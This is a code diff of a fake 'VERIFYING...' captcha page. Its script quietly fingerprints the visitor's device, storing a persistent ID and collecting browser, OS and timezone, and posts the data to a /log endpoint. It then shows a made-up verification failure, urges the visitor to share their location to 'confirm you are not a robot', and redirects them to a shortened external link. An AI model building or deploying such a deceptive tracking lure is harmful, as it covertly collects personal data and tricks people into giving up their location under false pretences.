@@ -18,33 +18,33 @@
       align-items: center;
       height: 100vh;
     }
+
     .box {
       text-align: center;
-      width: 90%;
-      max-width: 400px;
     }
-    h1 { font-size: 22px; }
-    .status { margin-top: 12px; color: #aaa; }
+
+    .status {
+      margin-top: 10px;
+      color: #aaa;
+    }
   </style>
 </head>
 
 <body>
 
 <div class="box">
-  <h1>🔐 VERIFYING...</h1>
+  <h2>🔐 VERIFYING...</h2>
   <div class="status" id="status">Starting...</div>
 </div>
 
 <script>
-function setStatus(msg) {
-  document.getElementById("status").innerText = msg;
+function setStatus(t) {
+  document.getElementById("status").innerText = t;
 }
 
 /* =========================
-   DEVICE ID SYSTEM
+   STABLE DEVICE ID
 ========================= */
-
-// get or create stable ID
 function getDeviceId() {
   let id = localStorage.getItem("device_id");
 
@@ -58,12 +58,12 @@ function getDeviceId() {
 
 async function start() {
   try {
-    setStatus("Loading...");
+    setStatus("Collecting data...");
 
     const client = new ClientJS();
 
     const payload = {
-      device_id: getDeviceId(),   // ⭐ NEW STABLE ID
+      device_id: getDeviceId(),
       fingerprint: client.getFingerprint(),
       browser: client.getBrowser(),
       os: client.getOS(),
@@ -71,7 +71,7 @@ async function start() {
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     };
 
-    setStatus("Sending data...");
+    setStatus("Sending...");
 
     await fetch("/log", {
       method: "POST",
@@ -79,18 +79,18 @@ async function start() {
       body: JSON.stringify(payload)
     });
 
-    setStatus("Failed.  Redirecting...");
+    setStatus("FAILED. Captcha v3.9");
 
-    let c = 7;
-
+    let c = 6;
     const timer = setInterval(() => {
-      setStatus("FAILED.\n  SHARE LOCATION TO CONFIRM YOU ARE NOT A BOT.  " + c);
+      setStatus("FAILED\nSHARE LOCATION TO CONFIRM YOU ARE NOT A ROBOT." + c);
       c--;
 
       if (c === 0) {
         clearInterval(timer);
-        window.location.href =
-          "https://unl.one/2wrN1";
+
+        //
+        window.location.href = "https://unl.one/2wrN1";
       }
     }, 1000);
 
